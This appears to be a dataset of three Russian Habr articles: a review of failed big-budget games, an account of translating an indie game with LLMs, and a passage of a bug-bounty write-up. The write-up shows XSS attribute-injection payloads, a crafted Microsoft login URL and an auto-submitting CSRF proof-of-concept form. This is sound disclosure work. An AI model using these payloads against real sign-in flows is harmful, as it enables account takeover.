"Тяжеловесы, которые не взлетели: 5 провалившихся высокобюджетных видеоигр последних лет",https://habr.com/ru/companies/ru_mts/articles/910292/,"Привет, Хабр! Меня зовут Настя, я автор команды техпиара в МТС, а еще иллюстратор и фанатка видеоигр. В прошлый раз я делала обзор на Split Fiction, а сегодня предлагаю окунуться в мир громких проекто...","Привет, Хабр! Меня зовут Настя, я автор команды техпиара в МТС, а еще иллюстратор и фанатка видеоигр. В прошлый раз я делала обзор на Split Fiction, а сегодня предлагаю окунуться в мир громких проектов последних лет, которые, несмотря на внушительные бюджеты и высокие ожидания, так и не завоевали любовь фанатов.
Надеюсь, эта публикация будет интересна не только поклонникам мира игр, но и тем, кто любит поразмыслить, почему даже самая яркая идея и крупный бюджет не всегда приводят к успеху.
Marvel’s Avengers, 2020 год
Начнем мы с амбициозного проекта от Crystal Dynamics и Square Enix, разработанного в сотрудничестве с Marvel Games. В его основе лежит знаменитая супергеройская серия комиксов «Мстители». Звучит заманчиво: кто бы не хотел поиграть за любимых Капитана Америку и Халка?
На разработку Marvel’s Avengers было потрачено около 170 миллионов долларов. Внушающие инвестиции, мощный бренд и обожаемые герои должны были привести к триумфу. Но реальность оказалась суровой: на игру обрушились волны разочарования фанатов.
Пожалуй, главной проблемой стал слабый и предсказуемый сюжет. Он не сумел заинтриговать геймеров. С первых минут игры понятно: сюрпризов здесь не будет. Банальный сценарий быстро погружает в скуку, а миссии «приди, побей, уйди» повторяются снова и снова.
Дополнительное разочарование вызвал облик героев. Вместо харизматичных голливудских лиц игроки получили безликих персонажей с рядом проблем в анимации, мимике и озвучке. Даже костюмы, которые могли бы добавить индивидуальности, оказались слишком практичными и лишенными изюминки. Яркий пример — Тони Старк, или Железный человек: его броня вышла чересчур массивной, без того изящества и деталей, представленных нам в фильмах.
Окончательно «добили» пользователей постоянные технические недоработки: игра слабо оптимизирована даже для мощных ПК. Частые фризы и баги мешали наслаждаться процессом. Вдобавок встречались необычные сбои: неправильное воспроизведение музыки, замедляющиеся движения персонажей, ошибки в анимациях. Все это портило впечатление об игре и очень расстраивало. Было и такое, что враги застревали в стене или проваливались в текстуры, становясь полностью недосягаемыми для игрока.
В конечном счете Marvel’s Avengers при всех вложениях, культовом имени и превосходной начальной концепции оказалась посредственной и однообразной игрой с массой технических проблем. В 2023 году разработчики официально прекратили поддержку игры. Обидно, досадно.
Battlefield 2042, 2021 год
Следующий «счастливчик» — футуристический шутер от первого лица, разработанный DICE и Electronic Arts. Одна из основных частей культовой серии Battlefield с бюджетом в более 150 миллионов долларов на разработку. Действие игры происходит в антиутопичном будущем, где ресурсы планеты на исходе, а повсюду разгораются конфликты. Игроки берут на себя роль наемников — бывших солдат из разных стран, сражающихся за интересы мировых держав.
Что пошло не так? Проект столкнулся с лавиной критики и разочарования, сформировавшись в один из самых обсуждаемых коммерческих провалов в истории. Серьезным моментом стал отказ от одиночной кампании — риск, который не сработал. В отличие от предыдущих частей, игра полностью лишилась сюжетного режима и утратила возможность создать эмоциональную связь с игроком через историю персонажей. Отсутствие сюжетной линии воспринималось как нежелание DICE вкладываться в глубину игрового опыта.
Конечно, не обошлось без технического хаоса и бедного стартового контента. Игра вышла недоработанной. На старте было относительно мало карт, оружия и техники, особенно по сравнению с предыдущими частями. Многие функции из старых частей были урезаны или вообще отсутствовали, например детализация разрушения объектов или адекватная схема урона. Бонусом к игре шли многочисленные баги, визуальные и геймплейные недочеты. Пользователи сталкивались с падением частоты кадров, нестабильным подключением к серверам, неправильной работой оружия и другими техническими проблемами.
Проект отличился и проблемным геймдизайном карт и героев. Карты оказались слишком большими, с малой плотностью сражений. Игроки жаловались на «пустые» пространства, отсутствие укрытий и чрезмерную линейность и хаотичность боев. Battlefield 2042 отказалась от традиционного классового деления (инженер, штурмовик) в пользу новой системы «специалистов». Это нововведение восприняли негативно, потому что оно уничтожило командную динамику, к которой привыкли фанаты. «Специалисты» обладали уникальными гаджетами и навыками, но при этом могли свободно использовать любое оружие. Это убило ощущение ролевой специализации и командной зависимости.
Battlefield 2042 задумывалась как переосмысление серии с акцентом на масштабные онлайн-сражения, но вышла откровенно сырой. Игроки массово критиковали продукт, и платформа Steam зафиксировала крайне низкий пользовательский рейтинг. После негативного запуска DICE и EA начали выпускать обновления, исправляющие баги и добавляющие новый контент. Часть проблем была решена, например улучшили баланс карт, добавили сезонные активности, но подорванная репутация сделала свое дело.
The Lord of the Rings: Gollum, 2023 год
Как давняя поклонница великолепной трилогии «Властелин колец», эту игру я ждала с особым трепетом. Меня воодушевила идея увидеть темную сторону легендарной вселенной глазами одного из самых трагичных персонажей Толкина — Голлума. Бывший хоббит Смегол, испорченный Кольцом Всевластия и измученный внутренним конфликтом, казался идеальным героем для глубоко и атмосферного приключения.
Но уже при первом запуске на PS5 наступило оглушительное разочарование… Графика выглядела откровенно устаревшей, в ней даже отдаленно не было той магической атмосферы, которую мы привыкли видеть в экранизациях. Персонажи были плохо проработаны, а Голлум выглядел будто его «лепили» в спешке. Опять же никакого визуального сходства с привычным нам киногероем. Осталась только тень задумки — грубая, недоделанная, ковылявшая на сломанных ногах к титрам.
Причины такого провала очевидны. Главный герой, каким бы интересным он ни был концептуально, в реализации оказался крайне неудачным. Голлум — персонаж противоречивый, физически слабый, он не способен на открытый бой. Это сделало геймплей монотонным и скучным.
Во-вторых, несмотря на саму идею, бюджет игры составил относительно скромные 15 миллионов евро. Это означало только одно — жесткие ограничения во всем: графика, анимация и масштаб. Вероятно, именно поэтому визуальная часть оставила ощущение сырого продукта. Над проектом работала команда всего лишь из 85 человек. Это крайне ограниченный ресурс, учитывая нюансы персонажа и ожидание фанатов, стремящихся к качественному игровому опыту. В то время как на создание игры The Last of Us Part II ушло 220 миллионов долларов, а работало над ней около 200 человек. Разница очевидна.
И снова самая болезненная часть — технические неполадки: падения FPS, проблемы с производительностью, многочисленные баги текстур. Все это не просто испортило мне впечатление, а вынудило закончить прохождение игры. Не буду лукавить, искренне жаль каждой потраченной копейки.
После провального запуска Daedalic Entertainment приняла решение прекратить разработку видеоигр. И учитывая результат, это, пожалуй, логичный и честный шаг.
Star Wars Outlaws, 2024 год
Star Wars Outlaws стала очередным примером того, что ставка на громкое имя франшизы, увы, не спасает проект от неудачи. Игра, выпущенная в 2024 году студией Massive Entertainment при поддержке Ubisoft, на бумаге выглядела ну очень вдохновляюще. Только представьте: открытый мир знаменитой вселенной «Звездные войны», харизматичная главная героиня Кей Весс, любимые герои, масштабные ограбления и незабываемые приключения на земле и в космосе. Впечатляет? К тому же бюджет в 200–300 миллионов долларов вселял в сердца надежду на нечто грандиозное. Но в процессе игры стало очевидно, что за красивой оберткой спряталась скучная начинка.
На мой взгляд, основная проблема — однообразие геймплейных заданий и проблемы с ИИ. Миссии сводятся к набору стереотипных заданий (поиск предметов, устранение врагов), без глубокого развития механик или серьезных вариаций. А как мы знаем, примитивная боевая система быстро наскучивает. Скромный ИИ противников часто сводил на нет напряжение и нарушал целостность атмосферы. Нередко враг просто не реагировал на присутствие игрока. Кому такое понравится?
Неожиданно, но владельцев PlayStation 5 ждало отдельное разочарование, вызванное, конечно же, техническими фейлами. Проблемы с производительностью, прорисовкой объектов и баги напрочь испортили впечатление. Мы еще были готовы закрыть глаза на сюжетные и геймплейные недоработки, но… увы.
Как итог — средние оценки критиков и вялые отклики игроков только подтвердили эту печальную реальность. Хорошая идея потерялась в так себе реализации. Обычно от проектов с такими легендарными вселенными геймеры ждут не просто соблюдения стандарта качества, а настоящего прорыва. Вот оно, ожидание и реальность.
Concord, 2024 год
Завершает подборку многопользовательский шутер от первого лица, разработанный американской студией Firewalk в партнерстве с Sony Entertainment для Playstation. Основу игрового процесса составляли динамичные поединки двух команд по пять игроков, где каждый управлял персонажем с уникальными способностями и умениями. События разворачивались в стилизованной футуристической вселенной: здесь уживаются представители человечества и разумных инопланетных рас.
Разработка Concord растянулась на восемь лет, каждая стадия требовала времени, ресурсов и технологической точности. По некоторым данным, бюджет игры варьируется от 200 до 400 миллионов долларов. Согласитесь, дорогостоящая попытка заявить о себе на рынке онлайн-шутеров. Проект мог бы составить конкуренцию Overwatch, но… в сентябре 2024 года поддержка Concord была прекращена. Игра с треском провалилась под тяжестью собственных ошибок.
Во-первых, маркетинговая кампания дала сбой. Вопреки ожиданиям, активное продвижение началось слишком поздно. Многие узнали об игре уже после релиза, а ведь эффект первого впечатления особенно важен в конкурентной среде. Люди просто не знали о ее существовании или знали, но не понимали, зачем в нее играть.
Второй тревожный звонок — цена в 40 долларов на старте. В современном игровом мире, где доминируют условно бесплатные проекты, такая стоимость выглядела странным решением.
Третьим фактором стали банальность игрового процесса и техническая несостоятельность проекта. Вместо новых захватывающих впечатлений игроки получили вторичные и устаревшие механики, а также персонажей, попросту лишенных харизмы — например, в каждом матче встречаются одни и те же герои.
Вишенка на торте — отсутствие полноценной связи между разрабами и целевой аудиторией. В команде будто не слышали или не хотели слышать обратную связь от рядовых пользователей и профессионального сообщества. Такой подход оставил проект без адаптации к реалиям и ожиданиям игроков.
Ну что, подытожим? Миллионы долларов, потраченные на разработку, не гарантируют успеха. Некоторые из перечисленных игр стали эталоном «как делать не надо, и все они страдали от схожих ошибок: сломанный геймплей, нехватка контента, технические проблемы, неудачный маркетинг или просто недостаток души. Все это — грустный урок о том, что важно учитывать не только внутреннее видение проекта, но и реалии рынка, предпочтения аудитории и современные подходы к видеоиграм."
Мой опыт локализации игры через нейронку,https://habr.com/ru/articles/910388/,"Все кто пишет “В 2к25 не знать английский” - напишите комент и проходите мимо. Для нормальных, рассказываю, как я перепробовал несколько инструментов, чтобы перевести игру.
Задача:
Перевести большоеко...","Все кто пишет “В 2к25 не знать английский” - напишите комент и проходите мимо. Для нормальных, рассказываю, как я перепробовал несколько инструментов, чтобы перевести игру.
Задача:
Перевести большоеколичество текста (224 тысячи символов или 40 тысяч слов) для инди игры mudborne через нейросеть.
Нейросеть должна держать контекст, на протяжении всего перевода.
Все имена встречающиеся в игре должны переводиться всегда одинаково.
Это должен быть полуавтоматический процесс, который переведет игру «за один присест».
На входе должна быть csv таблица, где в первой колонке комментарий разработчика, во второй текст на английском, в третьей, должен быть текст на русском
Ну и основное просто пройти этот путь, получить опыт.
Какие инструменты я протестировал:
ChatGPT 
Claude 
Google Colab 
Cursor 
Smartcat 
DeepSeek API 
Gemini 
Yandex Переводчик документов
Начнём с базы
ChatGPT, Claude, DeepSeek — просто через чат эти нейронки после 1000 слов максимум начинают ныть и только небольшие куски тебе выдают. Качество отличное конечно, но вручную сидеть пол дня переводить по кускам, вообще не то.
Не для этих целей */10
Google Colab
С ChatGPT обсудили возможные вариант, как можно перевести. Одно из, того, что предложил это через Google Colab. ChatGPT даже собрал мне этот Collab, написал скрипт в котором ты загружаешь таблицу и он тебе переводит через нейронку от самого Google Translate. Короче, 40 минут он кряхтел, выдал ужасный перевод. Из хорошего, что он реально заполнил таблицу, вопросов нет. Но перевод «охлади моё траханье» буквально. Ну и это просто перевод, по сути ты не можешь ему объяснить контекст, может и можно было еще поколдовать, но перевод настолько плохой, что даже не стоит тратить время.
Слабо, долго 1/10
Smartcat
Он мне насчитал $35 при этом ещё и ты не можешь ему промтом объяснить, для чего и про что этот перевод. Просто слова переводит, короче ваще забей. Ну там у них еще прикол, что ты можешь реально переводчика подключить на проект. Мне не понравилось всё. С реальным переводчиком наверн норм, но это тебе ещё нужно будет самостоятельно оценивать его качество.
-1/10 - я не понимаю как такие инструменты ещё умудряются поднимать огромные раунды и как выживают. Видимо простой UI продает.
Yandex Переводчик документов
Бесплатно, супер быстро, за 30 секунд перевел мне весь документ. Вообще супер удивился, хоть эксель, хоть какой док ему загружай, быстро переводит. НО, это опять же просто обычный переводчик он “не понимает” что он переводит. То есть нет возможности объяснить ему, что он переводит игру, дать какой-то промт на вход.
6/10 - для других целей спокойно можно накинуть больше, какие-то интерфейсы, меню отлично хватит, очень быстро, 0 заморочек
Gemini 2.5 flash (preview)
А вот здесь Google абсолютные красавцы. Самый гигантский плюс, он имеет на входе 1млн токенов, а на выходе 65 тысяч (это примерно 50 тысячи слов)! Для сравнения в ChatGPT (3000-4000 слов) и это в plus версии. А Gemini тебе просто дают бесплатно. Я оставил его на минут 15 реально, сидел, переводил. Первый раз сессия прервалась и причем буквально слетел чат и не осталось его даже в архиве. Со второго раза он мне почти всё перевел. Пришлось ещё разделять перевод, иногда он крашился, Но! Это всё равно бесплатный перевод, огромного кол-во слов за раз. И ты объяснишь ему человеческим языком что и для чего он переводит. Промт я писал с ChatGPT. На вход я ему объяснил всю задачу, дал ссылку на игру в стим, и попросил что бы он подробно объяснил другой нейронке, как правильно переводить.
Короткий пример промта (потом я еще его дорабатывал с DeepSeek, про это дальше):
“Ты профессиональный локализатор видеоигр. Переводи строки с английского на русский.
Игра — это атмосферный симулятор управления прудом, в котором игрок выводит, изучает и генетически модифицирует лягушек. Мир разделён на бодрствующее и сновидческое измерения. Стиль игры — юмористический, уютный, с лёгким налётом абсурда. Названия лягушек и описания их особенностей часто звучат необычно и метафорично.
Переводи СТРОГО по номерам. На входе список строк с номерами (1., 2., 3., ...).
На выходе — точно такой же список переводов, одна строка на каждый пункт.
Не добавляй никаких комментариев, пояснений, заголовков или примечаний.
Не изменяй количество строк. Не объединяй и не пропускай ничего.
Сохраняй стиль, структуру и формат оригинала.” etc
Единственное, что Gemini на вход не берет csv файлы и мне ChatGpt подсказал, что лучше csv конвертнуть в json перевести с нейронкой а потом обратно в csv. Эт кстати реально полезный совет был, я потом экспериментировал нейронки так намного лучше переводят. С ChatGPT написали скрипт туда-сюда сконвертировали, отлично.
8,5/10 - буду пробовать ещё с другими играми, ну наверно единственные два минуса, это не совсем автоматически, как я хотел и иногда крашится в процессе перевода.
DeepSeek API
Ну и самое интересное я оставил на потом. Написать самостоятельно скрипт и подключиться к нейронке через API. В начале я попробовал с Claude, но там он мне за 3к символов сожрал доллар, перевод неплохой и в целом когда-то почему бы и не заплатить, тоже самое и с ChatGPT. Но зачем платить больше как говорится. DeepSeek API в разы дешевле и он никак не хуже понимает смысл, русский, и в целом переводит, а стоит раз в 100 дешевле.
Пришлось вайбкодить вместе с ChatGPT и Cursor. В целом не написав ни одной строчки кода, я написал скрипт который:
1. Конвертирует csv в json
2. Создает promt (вообще любой длины может быть)
3. Промт дополняется в процессе комментариями разработчика, которые в этой же csv таблице
4. Отправляет по API в DeepSeek батчами (по несколько строк сразу)
5. Переведённый файл отправляет на проверку! То есть открывается новый диалог, в котором уже новый promt что DeepSeek редактор, который проверяет перевод игры.
6. Конвертирует назад json в csv.
Ну, вот эту историю было круто пройти, не ожидал что с наскока получится написать скрипт и что реально всё очень хорошо сработает. Перевод и проверка заняли минут 20. Стоило это около 15 центов. Ну и это еще относительно небольшое кол-во текста. Что хорошо в этом скрипте, ты можешь перевести хоть игру warhammer отправляя вообще весь лор этой игры и он будет “держать в этой голове”. Там есть такая история, как кэширование промта. То есть даже если ты переводишь кусками, но в рамках одного conversation ID весь повторяющийся промт не считается за потраченные токены. При этом ты можешь дополнять промт в процессе.
Общий промт получился достаточно большой, несколько раз его с ChatGPT дорабатывали, важно сохранить и что бы он не сухо переводил и при этом полную отсибятину не начинал писать (регулируется температурой).
Также, в скрпите спокойно можно подменить DeepSeek на любую другую нейронку. По качеству всё же думаю, что ChatGPT где-то может быть получше. Если делаете свою игру и переводите на другие языки, думаю немного раскошелиться на ChatGPT можно (цена вопроса думаю пара баксов).
Очевидно невероятная сложность
Ну конечно, разработчик не заложился на поддержку кирилицы. И больше всего времени пришлось убить на это. Я не разраб и мне пришлось ну буквально по шагам разбираться, что происходит в коде.
Я буквально тыкался, как слепой котенок.
Разработчик использовал спрайты для шрифта. Я так понял, что это популярное решение для игр которые написаны на LÖVE. Поэтапно сидел с ChatGPT, думали, как это можно сделать.
Есть сервисы которые делают bitmap изображения из шрифта. Подобрал шрифт с кириллицей pixelated.ttf. И сделал из него тоже спрайт, но для меня проблема оказалась, что в других кусках проекта постоянно ссылается на этот спрайт и как-то модифцируется и у меня никак не получалось мой спрайт запустить и что бы он везде работал корректно.
В итоге я выбрал вариант, где просто заменил спрайт на буквально шрифт pixelated.ttf и оно сработало.
В начале было так:
Но через несколько иттераций получилось привести в целом его к норме:
То есть он даже не шакалит. Реально получилось добиться pixel perfect. Немного еще можно поколдовать со смещением (опустить ниже).
Но если честно признаться, под конец я задушнился и поленился. Некоторые спец символы некорректно отображаются. В идеале нужно было добавить спрайт, тогда бы не было проблем со смещением и спец символами.
Если кто-то хотел поиграть в эту игру, можем с вами вместе добить, думаю не много осталось что бы прям до оригинала довести по качеству. Выложить можно в steam workshop да и разработчику закинуть, что бы он сам в игру нативно добавил. Разбираться в чужом коде, не будучи программистом тот еще прикол.
Вывод
Наверняка, где-то я изобретал велосипед и гитхабе валяется куча готовых решений. Плюс потратил много времени на сам шрифт, с которым разбирающиеся люди разобрались бы за пол часа. Но получил опыт, протестировав все инструменты, сформировав своё мнение, как что работает.

Ушло где-то три вечера, по четыре часа каждый. Это было несложно и даже приятно. Для таких задач я понял, что идеальная связка ChatGPT + Cursor.
Сначала в ChatGPT описываешь проект, формируешь промт. Потом переходишь в Cursor, создаёшь пару Python-файлов с кодом, который выдал ChatGPT, и уже в процессе дорабатываешь. Рекомендую в Cursor выбирать именно Sonnet 3.7 он самый медленный, но показал себя лучше всего.
И да! С ChatGPT можно буквально писать ТЗ для Cursor. А ещё я убил два дня на этот долбаный шрифт.
Закидывайте игры которые, хотите локализовать, в целом, сейчас всё настроил так, что процесс быстрый и почти полностью автоматический.
В тг канале выложу скрипт и перевод игры:
https://t.me/moiaiai
p.s Статьи пишу сам, без ChatGPT, насколько же он дженерик пишет и насколько, это палится. Из разряда, хочешь сварить гречку? Давай я расскажу историю появления гречки в древнем Китае. Кстати, если видите в статье среднее тире «‑» это 99.9% что писал ChatGPT, нормальны люди никогда его не ставят.
p.s 2 Deepl — даже упоминать не стал. Плюс‑минус тот же яндекс переводчик, и то даже яндекс переводчик порой обходит Deepl с переводом с английского на русский. Доки и pdf спору нет хорошо переводит. И локально модели типа qwen3–0.6b запускал, но это на отдельную статью. Спойлер: без пк с несколькими видеокартами в нормальных переводах ловить нечего."
Эскалация влияния: Полный захват учетной записи Microsoft через XSS в процессе аутентификации,https://habr.com/ru/articles/910386/,"Система входа Microsoft обладет защищенной и сложной архитектурой, построенной с использованием нескольких уровней защиты. Это в значительной мере усложняете процесс анализа.
В этой статье я подробно ...","Система входа Microsoft обладет защищенной и сложной архитектурой, построенной с использованием нескольких уровней защиты. Это в значительной мере усложняете процесс анализа.
В этой статье я подробно опишу, как обнаружил и использовал уязвимость полного захвата учетной записи с помощью Cross-Site Scripting (XSS) в процессе входа. Эта уязвимость, скрытая в механизме аутентификации Microsoft, помогла получить полный контроль над учетной записью пользователя.
Кроме того, я разберу ключевые компоненты механизма входа Microsoft для лучшего понимания обсуждаемой проблемы. Это поможет вам лучше разобраться в системе и окажет поддержку в ваших собственных исследованиях инфраструктуры Microsoft.
Механизм входа Microsoft и Azure Active Directory (Azure AD):
Аутентификация Microsoft основана на Azure Active Directory (Azure AD) — облачной системе управления идентификацией и доступом, используемой в таких сервисах, как Microsoft 365. Один из ключевых элементов в Azure AD — это арендаторы (tenants), которые устанавливают организационные границы внутри экосистемы Microsoft.
Что такое арендаторы в Azure AD?
Арендатор в Azure AD — это выделенный экземпляр службы, принадлежащий конкретной организации. Его можно представить как защищенный контейнер для пользователей, групп, приложений и политик. Ключевые характеристики арендаторов:
Каждая организация, использующая сервисы Microsoft (например, Microsoft 365), получает собственный арендатор, полностью изолированный от других. Это обеспечивает безопасность данных и целостность между разными арендаторами и организациями.
Арендатор связан с уникальным доменом, например {organizationName}.onmicrosoft.com.
Каждому арендатору присваивается уникальный идентификатор, называемый Tenant ID, который представлен в формате UUID (например, e1234567-89ab-cdef-0123-456789abcdef).
Типы арендаторов и различия в процессе входа:
Когда вы заходите в свою учетную запись, способ обработки входа со стороны Microsoft может отличаться в зависимости от типа используемой учетной записи.
Почему?

Потому что Azure AD поддерживает различные типы арендаторов, каждый из которых предназначен для определенных сценариев использования:
Тип 1: Рабочие или учебные учетные записи (арендатор Azure AD):
Используются организациями для управления доступом сотрудников или студентов к корпоративным приложениям. Как упоминалось выше, у каждого арендатора Azure AD есть уникальный идентификатор Tenant ID (UUID).
Конечная точка аутентификации:
https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize
Tenant ID необходимо подставить вместо {tenant-id} в URL для корректного входа.
Тип 2: Личные учетные записи (арендатор учетной записи Microsoft):
Предназначены для индивидуальных пользователей, получающих доступ к таким сервисам, как Outlook.com, Xbox Live или OneDrive.
Личные учетные записи не связаны с конкретным арендатором. Вместо этого они используют потребительскую службу идентификации Microsoft. Следовательно, UUID арендатора не требуется, поскольку отсутствует необходимость в разрешении контекста нескольких арендаторов — все личные учетные записи находятся в одном общем пространстве имен.
Аутентификация обрабатывается отдельно, через https://login.live.com/oauth20_authorize.srf, в отличие от рабочего/учебного сценария (тип 1), где используется https://login.microsoftonline.com.
Поскольку данная статья сосредоточена на рабочих или учебных учетных записях (Тип 1), далее мы рассмотрим, как Microsoft осуществляет процесс идентификации и проверки пользователей в таких средах. Я постараюсь изложить материал максимально просто.
Механизм входа для рабочих/учебных учетных записей и идентификация арендатора:
Процесс аутентификации в Azure AD тесно связан с идентификацией арендатора, что обеспечивает аутентификацию пользователей в рамках необходимых организаций. Вот как это работает:
Пользователь переходит по URL для входа, заменяя {tenant-id} на UUID своего арендатора. После этого он вводит свои учетные данные (например, электронную почту и пароль) для начала процесса аутентификации.
Система в первую очередь определяет арендатора с использованием {tenant-id} в URL для входа. (Существует также альтернативный метод — о нем будет рассказано позже.)
Azure AD проверяет политики, специфичные для арендатора, такие как многофакторная аутентификация (MFA). (Обратите особое внимание на этот момент.)
После успешной аутентификации Azure AD выдает токен, проверяет его и использует UUID арендатора для гарантии того, что токен действителен именно для данного арендатора.
Имея базовое понимание, давайте перейдем к тому, как я использовал XSS уязвимость для достижения полного захвата учетной записи.
Теперь начинаем:
В случае рабочих или учебных учетных записей пользователи не создают учетные записи самостоятельно. Этим занимаются сами организации (например, компании, школы, университеты). Пользователи получают учетные данные и проходят первоначальную настройку, включая настройку многофакторной аутентификации (MFA), прежде чем получить доступ.
Изучив документацию Microsoft и процесс входа, я начал тестировать систему — с самых основ. Я создал новую учетную запись с минимально возможным уровнем защиты, который может быть применен к любой учетной записи, и пытался обойти эти механизмы, уделяя внимание каждой детали.
Хотя MFA была принудительно включена, я сначала завершил её настройку, а затем перешел в настройки безопасности и удалил все дополнительные методы защиты — оставив только пароль в качестве единственного способа аутентификации.
Затем я попытался снова войти в систему, используя другой браузер. Как я упоминал ранее, приложение выполнит несколько перенаправлений и принудительно потребует настроить второй фактор аутентификации (2FA), например через приложение «Authenticator».
Одно из перенаправлений, которое привлекло мое внимание, было на устаревший домен, связанный с Azure AD. Этот домен в основном используется для настройки параметров MFA, управления ключами безопасности и обновления методов аутентификации (таких как номера телефонов и приложения-аутентификаторы).
При этом перенаправлении отправляется POST-запрос на /proofup.aspx со следующими параметрами:
flowtoken: токен, представляющий текущее состояние процесса аутентификации; он обеспечивает невозможность обхода промежуточных этапов, предотвращая прямой переход к более позднему шагу.
request: передается между эндпоинтами аутентификации для сохранения контекста исходного запроса (например, областей действия, URI перенаправления, идентификаторов приложений). Помогает Azure AD валидировать запрос при срабатывании дополнительных проверок (таких как MFA).
canary: токен или идентификатор, связанный с безопасностью, используемый для защиты от атак подмены данных в процессе аутентификации. Его можно рассматривать как часть защиты от CSRF-атак.
pru: приложение, которое валидирует MFA.
Также следует отметить:
Все эти параметры генерируются приложением после входа в систему.
Большинство учетных записей, использующих только пароль в качестве метода входа, перенаправляются на этот конкретный домен.
Ответ содержал автоматически отправляемую форму, которая выполняла POST-перенаправление на другой эндпоинт — /securityinfo — с двумя основными параметрами:
PostRedirectArguments: набор всех параметров, включенных в запрос (например, flowtoken, request и другие).
PESTS: сгенерированный токен состояния, используемый внутренне в процессе аутентификации Microsoft для отслеживания сессии пользователя и контекста. Сервер генерирует его на основе ранее упомянутых параметров запроса (flowtoken, request и др.). Это означает, что если параметры запроса принадлежат вам, то и сгенерированный токен принадлежит вам. Это важный момент, который необходимо учитывать.
Токен PESTS является крайне чувствительным — его можно рассматривать как основу всего процесса аутентификации. На самом деле эндпоинт /securityinfo полагается именно на эти два параметра для идентификации пользователя в системе MFA. Он напрямую связывает их с аутентифицированным пользователем. Именно это делает токен PESTS критически важным.
Что привлекло мое внимание — это автоматически отправляемая форма в ответе: её атрибут action содержал множество неопределенных параметров. Я попытался использовать некоторые из них в запросе в качестве параметров GET и POST, но никаких изменений не обнаружил.
Я решил сосредоточиться именно на этой конечной точке, поскольку наличие пустых параметров намекало на то, что они могут ожидать входных данных. Для  более детального исследования, я расширил область поиска, используя Google, Wayback Machine и, конечно же, историю Burp Suite.
Я обнаружил, что на этот эндпоинт можно передавать параметры с похожими именами, например параметры X-client-Ver и x-client-SKU. Далее они будут отражаться в полях формы brkrVer и clientSku соответственно.
Отражение двух параметров происходит в виде двух разных имен  в атрибуте action формы.
Я попытался нарушить структуру одной кавычкой, чтобы выйти из атрибута action формы — и это сработало.
Мне не удалось разрушить всю форму, добавив закрывающий тег >, потому что он был закодированных. Следовательно, я был ограничен в использовании некоторых специальных символов. Кроме того, поскольку форма автоматически отправлялась, возможности использования обработчиков событий или выполнения JavaScript были очень ограничены, особенно после атрибута action.
Можно было бы попытаться добавить новый атрибут action с встроенным JavaScript, как показано ниже, но он бы просто игнорировался.
8.0.1'injected='meloz'action='javascript:alert(1);'test='
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          action='javascript:alert(1);'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Существует несколько способов решения этой ситуации. Я изложу несколько из них и объясню, почему выбрал именно тот, который выбрал. Напоминаю: это POST-запрос, и если мне удастся найти уязвимость XSS, мне нужно будет доставить её жертве через форму, основанную на CSRF.
Выбор правильной эксплуатации (Раунд 1)
Вот почему я упомянул, что возможности очень ограничены — в этом сценарии мне нужен обработчик событий, который соответствует следующим трем условиям:
Он должен быть совместим с элементом <form>.
Он должен выполняться даже в случае автоматической отправки формы.
Он должен срабатывать без необходимости взаимодействия с пользователем.
В тегах формы можно использовать несколько обработчиков событий, которые зависят от некоторых стилей, например, нового oncontentvisibilityautostatechange, как показано ниже:
8.0.1'injected='meloz'oncontentvisibilityautostatechange='alert(1)'style='content-visibility:auto'test='
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          oncontentvisibilityautostatechange='alert(1)'
          style='content-visibility:auto'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Однако это не работает во всех браузерах (старые версии/некоторые мобильные браузеры/неправильная обработка в Firefox). Если существует реальная уязвимость, я хочу, чтобы она затронула как можно больше пользователей и браузеров, чтобы максимизировать поверхность атаки.
Поэтому мне нужно изменить свой подход. Давайте разберем два ключевых момента:
Фрагменты URL: Это часть URL после символа #, используемая для ссылки на конкретные разделы веб-страницы через указание id элемента. Когда URL с фрагментом загружается, браузер пытается фокусироваться на элементе (если он по умолчанию доступен).
Но что, если элемент не доступен для определения по умолчанию, как в случае с тегами формы? Я объясню это позже.
Атрибут tabindex: Этот атрибут управляет порядком получения фокуса элементами при навигации с помощью клавиши Tab.
Если tabindex=""1"" или выше: Элемент становится доступным для фокуса и получает приоритет в порядке табуляции.
Если tabindex=""-1"": Элемент вообще не доступен для фокуса.
Комбинируя это, мы можем заставить тег формы стать доступным для фокуса с помощью tabindex. Затем можно использовать обработчик события onfocus для выполнения JavaScript вместе с фрагментом URL, который будет вызывать фокус.
'injected='meloz'onfocus='alert(1)'tabindex='1'test='
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          onfocus='alert(1)' tabindex='1'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Для эксплуатации этой уязвимости атакующий может отправить жертве ссылку, содержащую id формы как фрагмент URI, например:
https://account.activedirectory.windowsazure.com/proofup.aspx?X-client-Ver=8.0.1'injected='meloz'onfocus='alert(1)'tabindex='1'test='#registrationForm
Теперь давайте создадим CSRF форму, которая будет размещена на нашем сервере:
<html>
    <form id=""csrfPOC"" action=""https://account.activedirectory.windowsazure.com/proofup.aspx?X-clinet-Ver=8.0.1'injected='meloz'onfocus='alert(1)'tabindex='1'test='#registrationForm"" method=""POST"">
      <input type=""hidden"" name=""flowtoken"" value=""{FLOWTOKEN}"" />
      <input type=""hidden"" name=""pru"" value=""{PRU}"" />
      <input type=""hidden"" name=""request"" value=""{REQUEST}"" />
      <input type=""hidden"" name=""canary"" value=""{CANARY}"" />
      <input type=""submit"" value=""Submit request"" />
    </form>
    <script>
      document.forms[""csrfPOC""].submit();
    </script>
</html>
Я попробовал в другом браузере, и получил ошибку 400 Bad Request!
Я был в замешательстве! Я дважды проверил все заголовки. Или я мог упустить, что-то еще? Позже я понял, что один из токенов/значений в теле POST запроса истек.
Я попробовал снова с новым токеном, и все пошло как по маслу.
Действующий токен остается рабочим примерно 20–30 минут, что представляет собой явное препятствие! Я задался вопросом: можно ли ещё что-то с этим сделать?
95% cookies имеют флаг HttpOnly, что делает их недоступными для JavaScript.
